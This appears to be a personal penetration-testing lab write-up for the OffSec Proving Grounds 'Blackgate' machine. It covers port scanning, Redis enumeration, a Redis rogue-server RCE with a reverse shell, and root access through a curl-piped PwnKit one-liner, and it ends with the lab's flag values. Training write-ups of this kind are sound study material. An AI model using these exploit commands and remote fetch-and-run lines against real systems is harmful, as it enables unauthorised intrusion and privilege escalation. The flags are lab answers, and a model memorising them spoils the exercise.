---
Date: 2024-10-14
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Hard
Status: In progress
IP: 192.168.243.176
Writeup: https://medium.com/@gleasonbrian/offsec-proving-grounds-blackgate-writeup-49920d4188de
---
# Blackgate
This is the first of the "Hard" machines I've tackled, so I'd been worried it may have been a major step up from what I'd been doing previously. Surprisingly though, this was very much a case of googling and learning about a service I'd never heard of (Redis), connecting to it to test a few commands, and then finding the version I was connected to had a well known RCE exploit and using it to achieve initial access!

Privilege escalation proved to be a bit more of a minefield though, mostly because I fixated on the fact the user had "run as root with no password" privileges for the same service I'd just abused to gain initial access - my first instinct was to try to learn more about Redis and potentially abuse the sudo privileges to achieve `root` access. 

In the end I ran `linpeas.sh` and identified that the target machine was vulnerable to `PwnKit`. Generally I've been ignoring the vulnerabilities `Linpeas.sh` recommends because they're often low-probability kernel exploits and are more effort to test than searching more something more obvious. In this case though, the PwnKit exploit I found is a super-simple one-liner, so I just ran it and got `root`!

The lesson here is to use what Linpeas is telling me, and not to be afraid of trying a kernel exploit if there's not a more obvious way to privilege escalate to root.

# Resolution summary
- Ran Nmap to identify ports `22` & `6379`
- Identified port `6379` as being associated with `redis`
- Researched `redis`, connected with netcat, and enumerated
- Identified `redis 4.0.14` and found RCE exploit
- Ran exploit and achieved reverse shell
- Enumerated target host & identified PwnKit vulnerability
- Ran exploit command, achieved `root` and printed `proof.txt`
## Improved skills
- Redis access and exploitation
- Privilege escalation with PwnKit vulnerability
## Used tools
- nmap
- python
- redis

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -T5 192.168.243.176 -v
sudo nmap -p 22,6379 -A 192.168.243.176 -v -oN Blackgate.nmap
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 38.448 days (since Sun Sep  8 09:17:53 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 8.3p1)
No enumeration conducted
## Port 80 - 6379 (Redis 4.0.14)
- Identified `Redis 4.0.14` from NMap scan, and attempted to connect with `nc -vn 192.168.243.176 6379`
![[Cybersecurity-Resources/images/Pasted image 20241016210705.png]]
- Enumerated `redis` with command `INFO`
![[Cybersecurity-Resources/images/Pasted image 20241016210758.png]]
- Enumerated `redis` with command `client list`
![[Cybersecurity-Resources/images/Pasted image 20241016211014.png]]
- Enumerated `redis` with command `CONFIG GET *` and identified `dump.rdb`
![[Cybersecurity-Resources/images/Pasted image 20241016211113.png]]
---
# Exploitation
- Identified `redis 4.0.14` is vulnerable to [CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)
- Identified Redis(<=5.05) RCE exploit from `https://github.com/n0b0dyCN/redis-rogue-server`
- Ran `./redis-rogue-server.py --rhost 192.168.243.176 --lhost 192.168.45.205` with command for reverse shell to port `4444`
![[Cybersecurity-Resources/images/Pasted image 20241016213143.png]]
- Caught reverse shell with netcat listener on port `4444` with user `prudence`
![[Cybersecurity-Resources/images/Pasted image 20241016213258.png]]

---
# Privilege Escalation
## Local Enumeration
 - Ran `cat /home/prudence/local.txt` and printed local flag `704c046724f3d52f31c9567446105364`
 ![[Cybersecurity-Resources/images/Pasted image 20241016213517.png]]
- Ran `cat /home/prudence/notes.txt` and identified `protected mode` not turned on
![[Cybersecurity-Resources/images/Pasted image 20241016213959.png]]
- Ran `cat /etc/passwd` to identify any other users
![[Cybersecurity-Resources/images/Pasted image 20241016213707.png]]
- Ran `sudo -l` to check `sudo` privileges and identified `prudence` can run `/usr/local/bin/redis-status` without a password
![[Cybersecurity-Resources/images/Pasted image 20241016213841.png]]
- Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download & run `linpeas.sh` 
![[Cybersecurity-Resources/images/Pasted image 20241016221127.png]]
- Identified potential vulnerabilities for privilege escalation
![[Cybersecurity-Resources/images/Pasted image 20241016220933.png]]
- script crashed at `Analyzing Redis Files`
![[Cybersecurity-Resources/images/Pasted image 20241016215416.png]]
- Checked for `redis.conf` and ran `grep -i pass /etc/redis/redis.conf` to check for passwords
![[Cybersecurity-Resources/images/Pasted image 20241016220223.png]]
- Ran `sudo /usr/local/bin/redis-status` and identified `redis-service` requires authorization key
![[Cybersecurity-Resources/images/Pasted image 20241016220419.png]]
## Privilege Escalation vector
- Identified target is potentially vulnerable to CVE-2021-4034 (PwnKit) and found exploit at `https://github.com/ly4k/PwnKit/tree/main`
- Ran `sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"` on target and achieved `root` access
![[Cybersecurity-Resources/images/Pasted image 20241016221513.png]]
- Ran `cat /root/proof.txt` to print `deefd9189289f94bf366e55ae58fdfd3`
![[Cybersecurity-Resources/images/Pasted image 20241016221614.png]]
---
# Trophy & Loot
`local.txt` = `704c046724f3d52f31c9567446105364`
`proof.txt` = `deefd9189289f94bf366e55ae58fdfd3`